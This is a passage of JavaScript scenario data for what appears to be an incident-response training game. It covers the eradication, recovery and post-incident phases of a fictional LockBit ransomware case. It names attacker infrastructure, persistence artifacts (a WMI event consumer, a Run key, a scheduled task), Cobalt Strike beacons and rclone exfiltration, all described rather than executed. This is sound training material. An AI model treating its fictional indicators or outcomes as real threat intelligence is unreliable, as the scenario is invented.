            desc: 'Limit investigation to the 3 file servers that showed ransom notes. Quick report to client.',
            quality: 'bad',
            score: { time: 15, containment: -10, evidence: -15, thoroughness: -20 },
            sets: f => {
              const open = rwChannelOpen(f);
              return { hostsKnown: 3, wmiKnown: f.wmiKnown || !!f.saw_wmiSub, exfilScope: f.saw_exfilDest ? 1 : 0, invLeak: open, exfilTenths: f.exfilTenths + (open ? 5 : 0) };
            },
            outcome: f => 'You miss 11 compromised workstations, the initial phishing vector, and multiple persistence mechanisms. Your incident report is incomplete.'
              + (f.wmiRemains && !f.saw_wmiSub ? ' Nothing in your scope would ever find the WMI subscription on DC-PROD-01 — the door the attacker would use to come back.' : '')
              + (f.saw_exfilDest ? ' At least the rclone transfer you tagged makes it into the report, so counsel hears that data left.' : ' The report tells counsel there is no evidence of data leaving the file servers.'),
          },
          {
            key: 'D',
            when: f => f.saw_stagingDir,
            label: 'Full forensic triage, and carve the staging directory for a file-level exfil manifest',
            desc: 'Image all 14 systems, and rebuild exactly which files were archived in C:\\ProgramData\\WindowsUpdate\\ and sent out.',
            quality: 'good',
            score: { time: -5, containment: 5, evidence: 30, thoroughness: 25 },
            sets: { hostsKnown: 14, wmiKnown: true, exfilScope: 2, fallbackBlocked: true, c2Blocked: true },
            outcome: f => `Everything the full forensic triage delivers — all 14 systems, the 5-day timeline, 3 persistence mechanisms — plus a manifest: the 7z archive lists in the staging directory, matched against rclone's transfer log, show exactly which files left. ${rwGB(f.exfilTenths)} GB, holding records for ${rwRecords(f.exfilTenths).toLocaleString('en-US')} customers: names, account numbers, SSNs. Counsel now has something to notify from.`
              + (!f.fallbackBlocked ? ' The imaged beacon.exe also gives up its failover host, update-cdn-sync[.]net — blocked.' : '')
              + (!f.c2Blocked ? ' You also get 185.220.101.34 and 91.243.44.12 blocked at the firewall at last.' : ''),
          },
        ],
        live: f => `ATTACKER CHANNEL: ${rwChannelOpen(f) ? 'OPEN' : 'BLOCKED'} · EXFIL ${rwGB(f.exfilTenths)} GB`,
        timeline: [
          { at: 6, when: f => rwChannelOpen(f), sev: 'warn', text: f => `WS-FIN-07: beacon check-in via ${f.c2Blocked ? 'update-cdn-sync[.]net' : '185.220.101.34'}`, score: { containment: -3 } },
          { at: 14, when: f => rwChannelOpen(f), sev: 'crit', text: 'WS-FIN-07: 0.2 GB of \\\\FS-PROD-05\\HR$ pulled out through the beacon',
            sets: f => ({ exfilTenths: f.exfilTenths + 2 }), score: { containment: -3 } },
        ],
        siemEntries: f => [
          { time: '04:30', sev: 'info', text: 'Beginning investigation phase — scope analysis' },
          { time: '04:32', sev: 'warn', text: 'Initial access: phishing email to jsmith — Feb 14' },
          { time: '04:35', sev: 'crit', text: 'Dwell time confirmed: 5 days before encryption' },
          { time: '04:38', sev: 'warn', text: `Data exfiltration: ${rwGB(f.exfilTenths)} GB financial records` },
        ],
      },
      { // ERADICATION
        name: 'ERADICATION',
        carried: f => {
          const out = [];
          if (f.invLeak) out.push({
            text: `The attacker channel stayed open after your investigation: another 0.5 GB left through ${f.c2Blocked ? 'update-cdn-sync[.]net' : '185.220.101.34'} before eradication began.`,
            score: { containment: -5 },
          });
          if (!f.svcDisabled) out.push({
            text: 'svc_backup — a domain admin the attacker holds — is still enabled.',
            score: { containment: -5 },
          });
          return out;
        },
        narrative: f => (f.hostsKnown === 14 ? 'Investigation is complete. You\'ve mapped the attacker\'s footprint. '
          : f.hostsKnown === 11 ? 'Investigation is complete — the IOC sweep scoped 11 of 14 hosts. '
          : 'You scoped the three file servers and called it done. ')
          + 'Now it\'s time to remove all traces of the adversary from the environment — persistence mechanisms, backdoors, compromised credentials, and malicious artifacts.',
        evidence: {
          title: 'PERSISTENCE & ARTIFACTS INVENTORY',
          content: f => {
            const wide = f.hostsKnown >= 11;
            const persist = [`Scheduled Task: "WindowsUpdate" on ${wide ? '6 hosts' : '3 hosts (file servers only)'} → svchost_update.exe`];
            if (f.wmiRemains && f.wmiKnown) persist.push('WMI Event Subscription: CommandLineEventConsumer on DC-PROD-01');
            if (!f.wmiRemains) persist.push('WMI Event Subscription on DC-PROD-01 — <span class="log-ok">removed during containment</span>');
            if (wide) persist.push('Registry Run Key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n      "SecurityUpdate" → C:\\ProgramData\\WindowsUpdate\\beacon.exe');
            persist.push(f.gpoReverted ? 'Modified GPO: Default Domain Policy — <span class="log-ok">reverted during containment</span>' : 'Modified GPO: Default Domain Policy — AV disabled, exclusions added');
            return `<span class="log-highlight">PERSISTENCE MECHANISMS FOUND:</span>
${persist.map((p, i) => `  [${i + 1}] ${p}`).join('\n')}

<span class="log-highlight">COMPROMISED CREDENTIALS:</span>
  - jsmith (domain user)
  - svc_backup (service account — domain admin)${f.svcDisabled ? ' — disabled' : ' — <span class="log-highlight">STILL ENABLED</span>'}
  - KRBTGT ${f.krbtgtReset ? '— first reset in containment, second scheduled behind replication' : '(golden ticket possible)'}
  - 3 additional service accounts used for lateral movement

<span class="log-highlight">MALICIOUS ARTIFACTS:</span>
  - svchost_update.exe (LockBit payload) — ${wide ? 6 : 3} hosts
  - beacon.exe (Cobalt Strike) — ${f.hostsKnown} hosts${wide ? `
  - stage2.ps1 (loader) — WS-JSMITH` : ''}
  - Exfil staging: C:\\ProgramData\\WindowsUpdate\\ — ${wide ? '8 hosts' : 'FS-PROD-02'}`;
          }
        },
        choices: [
          {
            key: 'A',
            label: 'Systematic removal: clear all persistence, reset all compromised creds, rebuild GPO',
            desc: 'Methodically remove every identified artifact, persistence mechanism, and compromised credential.',
            quality: 'good',
            score: { time: 5, containment: 15, evidence: 5, thoroughness: 20 },
            sets: f => ({ wmiRemains: f.wmiRemains && !f.wmiKnown, krbtgtReset: true, gpoReverted: true, svcDisabled: true, c2Blocked: true, beaconsLeft: 14 - f.hostsKnown }),
            outcome: f => 'All identified persistence mechanisms removed. All compromised passwords reset including KRBTGT (double reset). GPO restored to known-good state. Malicious files quarantined with hashes preserved for evidence.'
              + (!f.c2Blocked ? ' 185.220.101.34 and 91.243.44.12 are finally blocked at the firewall.' : '')
              + (f.hostsKnown < 14 ? ' EDR confirms no remaining artifacts matching the hashes you scoped.' : ' EDR confirms no remaining artifacts.'),
          },
          {
            key: 'B',
            label: 'Remove malware and reset passwords, but skip GPO and WMI cleanup',
            desc: 'Focus on the obvious threats — malware binaries and compromised accounts.',
            quality: 'partial',
            score: { time: 10, containment: 5, evidence: 0, thoroughness: -5 },
            sets: f => ({ svcDisabled: true, c2Blocked: true, krbtgtReset: f.krbtgtReset || !!f.saw_dcsync, beaconsLeft: 14 - f.hostsKnown }),
            outcome: f => {
              const left = [f.wmiRemains ? 'the WMI persistence' : '', f.gpoReverted ? '' : 'the GPO modifications'].filter(Boolean);
              return 'Malware removed and passwords reset.'
                + (left.length ? ` However, ${left.join(' and ')} remain${left.length === 1 ? 's' : ''}.` : ' The WMI subscription and GPO were already dealt with during containment, so skipping them costs nothing this time.')
                + (f.gpoReverted ? '' : ' AV exclusions in the GPO create a blind spot.')
                + (f.wmiRemains ? ' The WMI event subscription is a ticking time bomb if the attacker crafted it to trigger on a future event.' : '')
                + (f.krbtgtReset ? ''
                  : f.saw_dcsync ? ' Because you documented the DCSync, KRBTGT goes on the list as a double reset, with replication allowed to converge in between.'
                  : ' KRBTGT is reset once, like every other account — but the previous key stays valid after a single reset, so a golden ticket forged from the DCSync still works.');
            },
          },
          {
            key: 'C',
            label: 'Wipe and reimage all affected systems from scratch',
            desc: 'Nuclear option — flatten everything and rebuild from known-good backups.',
            quality: 'partial',
            score: { time: -15, containment: 20, evidence: -10, thoroughness: 10 },
            sets: f => ({ reimaged: true, beaconsLeft: 14 - f.hostsKnown }),
            outcome: f => 'All affected systems reimaged from clean media. Extremely thorough from a containment perspective, but you lost additional forensic evidence that legal counsel later needed. The reimaging process takes 3 days and the client loses significant productivity. '
              + (f.gpoReverted && !f.wmiRemains && f.krbtgtReset && f.svcDisabled
                ? 'AD-level persistence was already handled during containment — the only reason reimaging endpoints was enough.'
                : 'GPO and AD-level persistence wasn\'t addressed by reimaging endpoints.'),
          },
        ],
        live: f => `ATTACKER CHANNEL: ${rwChannelOpen(f) ? 'OPEN' : 'BLOCKED'} · SVC_BACKUP: ${f.svcDisabled ? 'DISABLED' : 'ENABLED'}`,
        timeline: [
          { at: 10, when: f => f.wmiRemains, sev: 'warn', text: 'DC-PROD-01: scrcons.exe spawned powershell.exe (WMI event consumer)', score: { containment: -3 } },
        ],
        siemEntries: f => [
          { time: '06:00', sev: 'info', text: 'Eradication phase initiated — removing persistence' },
          { time: '06:05', sev: 'success', text: `Scheduled tasks removed from ${f.hostsKnown >= 11 ? 6 : 3} hosts` },
          ...(f.wmiRemains && f.wmiKnown ? [{ time: '06:12', sev: 'warn', text: 'WMI subscription found on DC — removal requires care' }] : []),
        ],
      },
      { // RECOVERY
        name: 'RECOVERY',
        carried: f => {
          const out = [];
          if (f.backupLoss) out.push({
            text: (f.backupLoss === 'encrypted' ? 'VEEAM-01 was encrypted during triage' : 'svc_backup purged the local Veeam repository')
              + '. Restores come from the weekly immutable copy in object storage — Feb 13 23:00 — pulled over the WAN: slower, and five days of changes are lost.',
            score: { time: -5 },
          });
          if (!f.gpoReverted) out.push({
            text: 'The Default Domain Policy still disables AV. Every restored server would come up unprotected.',
            score: { containment: -5 },
          });
          if (f.exfilScope === 0) out.push({
            text: 'Your report told counsel nothing left the network. LockBit\'s negotiator says otherwise — and attaches a directory listing of Meridian\'s Finance share.',
            score: { thoroughness: -10 },
          });
          if (f.beaconsLeft > 0) out.push({
            text: `EDR alert: a beacon.exe variant with a hash nobody swept for, on one of ${f.beaconsLeft} host${f.beaconsLeft === 1 ? '' : 's'} the investigation never scoped.`,
            score: { containment: -5 },
          });
          return out;
        },
        narrative: f => `Eradication is complete. The client needs to resume business operations. ${f.serversEncrypted} encrypted servers need to be restored, and you need to verify the environment is clean before bringing systems back online.`
          + (f.backupLoss ? ' With the local restore points gone, the CFO is asking out loud whether paying LockBit would be faster.' : ''),
        evidence: {
          title: 'RECOVERY STATUS',
          content: f => `<span class="log-ok">BACKUP ASSESSMENT:</span>
${f.backupLoss ? `  - Local Veeam repository: <span class="log-highlight">DESTROYED</span> (${f.backupLoss === 'encrypted' ? 'encrypted with VEEAM-01' : 'restore points deleted via svc_backup'})
  - Immutable offsite copy: Feb 13 23:00 (weekly, object lock) — VERIFIED
  - Restore path: WAN pull from object storage (~14 h per server)
  - Data loss window: Feb 13 23:00 → Feb 19 (5 days)`
  : `  - Last clean backup: Feb 13 23:00 (before compromise execution)
  - Backup integrity: VERIFIED (offline/immutable backups)
  - Local repository: nightly file-level restore points through Feb 18 23:00`}
  - Backup coverage: ${RW_SERVERS.slice(0, Math.min(f.serversEncrypted, 6)).join(', ')} — full file-level
  - DC backup: System state from Feb 13 — clean

<span class="log-warn">BUSINESS IMPACT:</span>
  - ${f.serversEncrypted} servers offline — ~${rwStaff(f.serversEncrypted)} employees affected${f.serversEncrypted >= 6 ? `
  - Loan-servicing database (SQL-FIN-01) offline` : ''}
  - Email system operational (Exchange Online — unaffected)
  - ERP system operational (SaaS — unaffected)
  - Client requesting ETA for full restoration

<span class="log-warn">EXTORTION:</span>
  - Demand: $450,000 in Bitcoin via LockBit negotiation portal
  - Data theft claim: ${f.exfilScope ? `consistent with ${rwGB(f.exfilTenths)} GB confirmed exfiltrated` : 'LockBit claims to hold Meridian data — not yet verified'}
  - OFAC / sanctions screening: not yet performed

<span class="log-ok">MONITORING:</span>
  - EDR coverage: 100% of endpoints
  - Enhanced monitoring rules deployed
  - Threat hunting queries active`
        },
        choices: [
          {
            key: 'A',
            label: 'Staged recovery: restore one server, verify clean, then proceed with others',
            desc: 'Restore FS-PROD-01 first as a canary. Monitor for 4 hours. Then restore remaining servers.',
            quality: 'good',
            score: { time: 5, containment: 10, evidence: 5, thoroughness: 15 },
            // The 4-hour canary window is watched by enhanced EDR across the estate
            sets: (f, st) => ({ recoveryStartMin: st.elapsed, recoveryHours: rwRestoreHours(f, 'staged'), wmiRemains: false }),
            outcome: f => `FS-PROD-01 restored from ${f.backupLoss ? 'the immutable offsite copy' : 'clean backup'} and monitored for 4 hours — `
              + (f.wmiRemains ? 'and the canary earns its keep: in hour three, EDR flags scrcons.exe on DC-PROD-01 spawning PowerShell. It is the WMI subscription nobody removed; you pull it before anything else comes back online.' : 'no suspicious activity.')
              + ' Remaining servers restored in parallel. '
              + (f.beaconsLeft > 0 ? 'Enhanced EDR monitoring shows the restored servers clean.' : 'Enhanced EDR monitoring confirms clean environment.')
              + ` Full operations restored within ${rwDuration(rwRestoreHours(f, 'staged'))} with confidence.`
              + (f.backupLoss ? ' Five days of changes since Feb 13 have to be re-keyed from email and paper.' : ''),
          },
          {
            key: 'B',
            label: 'Restore all servers simultaneously from backup',
            desc: 'Parallel restore of all encrypted servers. Fastest path to business resumption.',
            quality: 'partial',
            score: { time: 15, containment: 0, evidence: 0, thoroughness: -5 },
            sets: (f, st) => ({ recoveryStartMin: st.elapsed, recoveryHours: rwRestoreHours(f, 'parallel') }),
            outcome: f => 'All servers restored in parallel. '
              + (f.backupLoss ? `Even pulling everything at once from object storage, it takes ${rwDuration(rwRestoreHours(f, 'parallel'))}.` : 'Operations resume quickly, client is happy with the speed.')
              + ' However, you didn\'t verify the backup was truly clean before mass deployment — fortunately it was, but this approach carried unnecessary risk.'
              + (f.wmiRemains ? ' Nobody was watching the DC while it happened, either.' : ''),
          },
          {
            key: 'C',
            when: f => !f.backupLoss,
            label: 'Pay the ransom to get the decryption keys, then restore',
            desc: 'The client\'s CFO is pressuring to pay. Use the decryptor and skip the backup restore.',
            quality: 'bad',
            score: { time: -5, containment: -15, evidence: -10, thoroughness: -20 },
            sets: (f, st) => ({ recoveryStartMin: st.elapsed, ransomPaid: true, recoveryHours: rwRestoreHours(f, 'paid') }),
            outcome: 'Against best practices, the client pays $450,000 in Bitcoin — with intact backups, and without the sanctions screening Treasury expects: LockBit\'s administrator and several affiliates are on OFAC\'s SDN list, and a sanctions violation is strict liability. The decryptor works on only 60% of files — the rest are corrupted. You still need to restore from backup anyway. The payment funds further criminal operations and paints the client as a willing payer for future attacks. Cyber insurance may not cover the ransom. Nor does it buy back the stolen data: a promise to delete it is unenforceable, and LockBit has been caught keeping data from victims who paid.',
          },
          {
            key: 'C',
            when: f => !!f.backupLoss,
            label: 'Pay the ransom — the local backups are gone and the CFO wants the decryptor',
            desc: 'The immutable copy is five days stale and a multi-day WAN restore. LockBit wants $450,000 in Bitcoin.',
            quality: 'bad',
            score: { time: -5, containment: -15, evidence: -10, thoroughness: -20 },
            sets: (f, st) => ({ recoveryStartMin: st.elapsed, ransomPaid: true, recoveryHours: rwRestoreHours(f, 'paid') }),
            outcome: f => `The client pays $450,000 in Bitcoin without a sanctions screening: LockBit's administrator and several affiliates are on OFAC's SDN list, and a sanctions violation is strict liability — the carrier refuses to reimburse. Negotiation and the decryptor take two days; it recovers about 60% of files at their Feb 19 state, and the rest are corrupted and come back from the Feb 13 immutable copy anyway — the restore you were trying to avoid. Full operations take ${rwDuration(rwRestoreHours(f, 'paid'))}. The payment funds further criminal operations, marks Meridian as a willing payer, and buys nothing on the stolen data: LockBit has been caught keeping data from victims who paid.`,
          },
        ],
        live: f => `SERVERS DOWN: ${f.serversEncrypted} · ~${rwStaff(f.serversEncrypted)} STAFF WITHOUT FILES`,
        timeline: [
          { at: 5, sev: 'warn', text: 'CFO to CISO, cc IR lead: "Why are we not just paying them?"' },
          { at: 12, sev: 'crit', text: 'LockBit leak site: "Meridian Financial Group" listed — 10-day countdown', score: { thoroughness: -3 } },
        ],
        siemEntries: f => [
          { time: '10:00', sev: 'info', text: 'Recovery phase — backup verification in progress' },
          f.backupLoss
            ? { time: '10:15', sev: 'warn', text: 'Local repository lost — immutable offsite copy (Feb 13) verified' }
            : { time: '10:15', sev: 'success', text: 'Backup integrity verified — clean pre-compromise snapshot' },
          { time: '10:20', sev: 'info', text: 'Client CISO requesting restoration timeline' },
        ],
      },
      { // POST-INCIDENT
        name: 'POST-INCIDENT',
        // The review meeting is scheduled once full operations are back
        at: f => f.recoveryStartMin + f.recoveryHours * 60 + 30,
        carried: f => {
          const foot = rwFoothold(f);
          return foot.length ? [{
            text: `You are writing the report while the attacker still has a way back into Meridian: ${foot.join('; ')}.`,
            score: { thoroughness: -10 },
          }] : [];
        },
        narrative: 'Systems are restored and the immediate crisis is over. Now comes the critical final phase: documentation, lessons learned, and hardening recommendations. The client\'s CISO has scheduled a post-incident review meeting. Your report will influence their security roadmap.',
        evidence: {
          title: 'INCIDENT SUMMARY DRAFT',
          content: (f, st) => `<span class="log-ok">INCIDENT TIMELINE:</span>
  Initial access:    Feb 14 09:12 (phishing)
  Privilege escalation: Feb 14 11:00
  Lateral movement:  Feb 14-18 (5 days)
  Data exfiltration:  Feb 18 02:22 onward (${f.exfilScope ? `${rwGB(f.exfilTenths)} GB` : 'volume not scoped'})
  Encryption:        Feb 19 03:01
  Detection:         Feb 19 03:01 (41 min to escalation)
  Containment:       ${rwStamp(f.containedAt + 8)}
  Recovery complete: ${rwClockAt(f)}
  Time on incident:  ${formatElapsed(st.elapsed)}

<span class="log-warn">IMPACT:</span>
  Servers encrypted:  ${f.serversEncrypted} (${RW_SERVERS.slice(0, f.serversEncrypted).join(', ')})
  Data exfiltrated:   ${f.exfilScope === 2 ? `${rwGB(f.exfilTenths)} GB — ${rwRecords(f.exfilTenths).toLocaleString('en-US')} customer records (manifest)`
    : f.exfilScope === 1 ? `${rwGB(f.exfilTenths)} GB — contents not catalogued` : '<span class="log-highlight">not scoped</span>'}
  Backups:            ${f.backupLoss ? '<span class="log-highlight">local repository lost</span> — weekly immutable copy used' : 'intact — local repository used'}
  Ransom:             ${f.ransomPaid ? '<span class="log-highlight">$450,000 paid (BTC)</span>' : 'not paid'}

<span class="log-warn">KEY FINDINGS:</span>
  - Phishing email bypassed email gateway (no macro blocking)
  - No MFA on service accounts
  - Excessive privileges: svc_backup had domain admin${f.backupLoss ? ' and owned the backups' : ''}
  - EDR alerting was functional but SOC response was delayed
  - ${f.backupLoss ? 'Only the immutable offsite copy survived — the local repository was reachable by a compromised account' : 'Immutable backups saved the recovery'}`
        },
        choices: [
          {
            key: 'A',
            label: 'Full post-incident report with root cause analysis, timeline, and hardening plan',
            desc: 'Comprehensive report: executive summary, technical timeline, IOCs, MITRE mapping, 12 prioritized recommendations.',
            quality: 'good',
            score: { time: 5, containment: 5, evidence: 10, thoroughness: 25 },
            outcome: (f, st) => {
              const n = st.findings.length;
              const foot = rwFoothold(f);
              return (n >= 6 ? `The IOC appendix lists ${n} findings you documented during the response. ` : `The IOC appendix is thin — ${n} documented finding${n === 1 ? '' : 's'}. `)
                + (f.saw_phishXlsm || f.saw_stage2 ? '' : 'The root-cause section has to be rebuilt from the mail gateway afterwards; nobody documented the macro or the download cradle when they were on screen. ')
                + 'Your detailed report becomes a blueprint for security improvements. The client implements MFA on all service accounts, deploys macro blocking, reduces svc_backup privileges, and establishes a 24/7 SOC monitoring contract. They\'re better prepared for next time.'
                + (f.exfilScope === 2 ? ` Because you built a file-level manifest, counsel files the 72-hour notice with NYDFS (23 NYCRR 500.17) on time and notifies exactly the ${rwRecords(f.exfilTenths).toLocaleString('en-US')} customers whose records left.`
                  : f.exfilScope === 1 ? ' Without a file-level manifest, counsel cannot say whose records left, so all 38,000 customers are notified — a far bigger bill and a far bigger headline.'
                  : ' The notification section has to be rewritten: exfiltration was never scoped, and customers are told only after LockBit publishes their data.')
                + (f.exfilScope ? (f.saw_exfilDest ? ' The regulator filing cites the rclone transfer to 91.243.44.12 you documented.' : ' The regulator asks where the data went; answering takes another week of log pulls.') : '')
                + (foot.length ? ` But the hardening plan lands on an environment the attacker can still reach: ${foot.join('; ')}.` : '');
            },
          },
          {
            key: 'B',
            label: 'Standard incident report with timeline and basic recommendations',
            desc: 'Cover the essentials: what happened, when, and a few recommendations.',
            quality: 'partial',
            score: { time: 10, containment: 0, evidence: 5, thoroughness: 5 },
            outcome: 'The report covers the incident adequately but doesn\'t dive into root causes or provide a prioritized hardening roadmap. The client fixes the most obvious issues (macro blocking) but doesn\'t address the service account privilege problem.',
          },
          {
            key: 'C',
            label: 'Close the ticket — the systems are back up, job done',
            desc: 'Mark the incident as resolved. The client can figure out improvements on their own.',
            quality: 'bad',
            score: { time: 15, containment: -5, evidence: -10, thoroughness: -25 },
            outcome: f => {
              const foot = rwFoothold(f);
              return 'No formal report, no lessons learned, no recommendations. The client doesn\'t address root causes. '
                + (foot.length ? `Two weeks later the attacker walks back in through what you left behind (${foot[0]}) and deploys LockBit again.` : 'Six months later, a similar phishing attack succeeds again because nothing changed.')
                + ' Your MSSP\'s reputation takes a hit.';
            },
          },
        ],
        siemEntries: [
          { time: '18:30', sev: 'success', text: 'All systems restored — business operations resumed' },
          { time: '18:35', sev: 'info', text: 'Post-incident review scheduled — documentation required' },
          { time: '18:40', sev: 'info', text: 'Client CISO requesting formal incident report' },
        ],
      },
    ],
  }
);
